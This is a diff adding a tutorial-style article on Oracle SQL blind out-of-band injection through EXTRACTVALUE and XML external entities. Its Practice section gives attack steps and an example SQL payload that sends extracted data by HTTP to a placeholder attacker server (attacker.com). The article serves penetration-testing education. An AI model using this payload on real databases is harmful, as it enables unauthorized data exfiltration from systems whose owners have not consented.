@@ -1,0 +1,61 @@
+---
+title: 'EXTRACTVALUE: Oracle SQL Blind Out-of-Band'
+description: Learn to exploit Oracle SQL blind out-of-band injection using EXTRACTVALUE
+  for data extraction.
+keywords:
+- EXTRACTVALUE
+- Oracle SQL
+- blind out-of-band injection
+- SQL injection
+- XML data extraction
+---
+
+# EXTRACTVALUE
+
+## Context
+
+This article focuses on exploiting the Oracle SQL blind out-of-band injection technique using the `EXTRACTVALUE` function. To follow this instruction, readers should be familiar with SQL query structures, XML parsing, and Oracle SQL injection techniques.
+
+## Theory
+
+### EXTRACTVALUE Function in Oracle
+
+The `EXTRACTVALUE` function is a powerful feature in Oracle SQL used to extract data from XML documents. It allows querying and manipulation of XML data using an XMLType. While intended for legitimate XML data manipulation, it can be exploited for SQL injection attacks by cleverly injecting malicious XML data.
+
+SQL injection through `EXTRACTVALUE` takes advantage of its parsing capabilities to execute crafted XML payloads containing external entity references. This technique can be used maliciously to leak sensitive data or interact with external systems.
+
+### Blind Out-of-Band Injection
+
+Blind out-of-band injection is a sophisticated SQL injection technique where attackers extract information indirectly by triggering server-side operations that generate external interactions. Unlike traditional injection attacks that directly return results within the application's interface, out-of-band techniques rely on side channels such as HTTP requests, making detection more challenging.
+
+In the context of `EXTRACTVALUE`, an attacker injects XML payloads that force the database to execute out-of-band HTTP requests to an attacker-controlled server. This enables attackers to infer information based on the server’s interaction, effectively bypassing restrictions where direct output isn't possible.
+
+## Practice
+
+### EXTRACTVALUE Blind Out-of-Band Injection
+
+To perform a blind out-of-band injection with `EXTRACTVALUE`, follow these steps:
+
+- **Identify injectable parameters:**
+  - Begin by analyzing the Oracle SQL queries for injectable points where the XML payload can be placed. This is often a user input or a parameter in a web application that interacts with the database.
+
+- **Inject the malicious XML payload:**
+  - Use the following command to inject the `EXTRACTVALUE` payload into an injectable SQL query parameter:
+
+    ```sql
+    SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/?data=secret"> %ext;]>'), '/l') FROM dual;
+    ```
+
+  This payload attempts to retrieve an external entity `%ext` from an attacker's server `http://attacker.com`. The `data=secret` will be replaced by the actual data extracted during the process.
+
+- **Monitor external server logs:**
+  - Once the payload is injected, monitor the logs on the attacker-controlled server (`attacker.com`) to capture incoming requests. These requests reveal information about the data extracted from the database.
+
+#### Result
+By using the EXTRACTVALUE out-of-band injection, an attacker gains the ability to extract sensitive data indirectly via external server interactions. This method is effective in scenarios where direct data extraction is restricted or heavily monitored.
+
+## Tools
+
+- **Burp Suite**: A comprehensive web application security testing tool that can be used to identify and exploit SQL injection points.
+
+- **SQLMap**: An open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.
